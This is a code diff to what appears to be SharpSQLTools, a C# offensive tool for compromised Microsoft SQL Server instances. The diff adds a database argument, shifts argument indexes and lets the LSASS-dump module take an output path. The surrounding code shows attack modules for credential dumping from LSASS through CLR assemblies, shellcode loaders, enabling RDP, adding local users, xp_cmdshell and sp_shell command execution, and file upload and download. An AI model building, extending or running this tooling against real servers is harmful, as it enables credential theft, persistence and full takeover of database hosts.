@@ -30,7 +30,7 @@ enable_clr                 - you know what it means
 disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
-clr_dumplsass              - dumplsass by clr
+clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
 clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
@@ -270,11 +270,12 @@ exit                       - terminates the server process (and this session)"
             string target = args[0];
             string username = args[1];
             string password = args[2];
+            string database = args[3];
 
             try
             {
                 //sql建立连接
-                string connectionString = String.Format("Server = \"{0}\";Database = \"master\";User ID = \"{1}\";Password = \"{2}\";", target, username, password);
+                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target,database, username, password);
                 Conn = new SqlConnection(connectionString);
                 Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                 Conn.Open();
@@ -334,8 +335,14 @@ exit                       - terminates the server process (and this session)"
                             setting.Disable_ole();
                             break;
                         case "clr_dumplsass":
-                            clr_exec("clr_dumplsass");
-                            break;
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
+                           // clr_exec("clr_dumplsass");
+                           // break;
                         case "clr_rdp":
                             clr_exec("clr_rdp");
                             break;
@@ -424,11 +431,12 @@ exit                       - terminates the server process (and this session)"
             string target = args[0];
             string username = args[1];
             string password = args[2];
-            string module = args[3];
+            string database = args[3];
+            string module = args[4];
             try
             {
                 //sql建立连接
-                string connectionString = String.Format("Server = {0};Database = master;User ID = {1};Password = {2};", target, username, password);
+                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target, database, username, password);
                 Conn = new SqlConnection(connectionString);
                 Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
                 Conn.Open();
@@ -456,13 +464,13 @@ exit                       - terminates the server process (and this session)"
                     case "xp_cmdshell":
                         {
                             String command = String.Empty;
-                            if (args.Length > 5)
+                            if (args.Length > 6)
                             {
-                                for (int i = 4; i < args.Length; i++) { command += args[i] + " "; }
+                                for (int i = 5; i < args.Length; i++) { command += args[i] + " "; }
                             }
                             else
                             {
-                                command = args[4];
+                                command = args[5];
                             }
                             xp_shell(command);
                             break;
@@ -471,23 +479,23 @@ exit                       - terminates the server process (and this session)"
                         {
                             {
                                 String command = String.Empty;
-                                if (args.Length > 5)
+                                if (args.Length > 6)
                                 {
-                                    for (int i = 4; i < args.Length; i++) { command += args[i] + " "; }
+                                    for (int i = 5; i < args.Length; i++) { command += args[i] + " "; }
                                 }
                                 else
                                 {
-                                    command = args[4];
+                                    command = args[5];
                                 }
                                 sp_shell(command);
                                 break;
                             }
                         }
                     case "upload":
-                        UploadFiles(args[4], args[5]);
+                        UploadFiles(args[5], args[6]);
                         break;
                     case "download":
-                        DownloadFiles(args[5], args[4]);
+                        DownloadFiles(args[6], args[5]);
                         break;
                     case "enable_ole":
                         setting.Enable_ola();
@@ -496,8 +504,14 @@ exit                       - terminates the server process (and this session)"
                         setting.Disable_ole();
                         break;
                     case "clr_dumplsass":
-                        clr_exec("clr_dumplsass");
-                        break;
+                        {
+                            String s = String.Empty;
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
+                    //clr_exec("clr_dumplsass");
+                    //break;
                     case "clr_rdp":
                         clr_exec("clr_rdp");
                         break;
@@ -507,35 +521,35 @@ exit                       - terminates the server process (and this session)"
                     case "clr_adduser":
                         {
                             String s = String.Empty;
-                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                             clr_exec(s);
                             break;
                         }
                     case "clr_scloader":
                         {
                             String s = String.Empty;
-                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                             clr_exec(s);
                             break;
                         }
                     case "clr_scloader1":
                         {
                             String s = String.Empty;
-                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                             clr_exec(s);
                             break;
                         }
                     case "clr_scloader2":
                         {
                             String s = String.Empty;
-                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                             clr_exec(s);
                             break;
                         }
                     case "clr_download":
                         {
                             String s = String.Empty;
-                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
                             clr_exec(s);
                             break;
                         }
@@ -575,11 +589,11 @@ exit                       - terminates the server process (and this session)"
         }
         static void Main(string[] args)
         {
-            if (args.Length == 3)
+            if (args.Length == 4)
             {
                 interactive(args);
             }
-            else if (args.Length > 3)
+            else if (args.Length > 4)
             {
                 Noninteractive(args);
             }
@@ -588,8 +602,8 @@ exit                       - terminates the server process (and this session)"
                 logo();
                 Console.WriteLine("Usage:");
                 Console.WriteLine(@"
-SharpSQLTools target username password                   - interactive console
-SharpSQLTools target username password module command    - non-interactive console");
+SharpSQLTools target username password database                   - interactive console
+SharpSQLTools target username password database module command    - non-interactive console");
                 Console.WriteLine("\nModule:");
                 Help();
                 return;
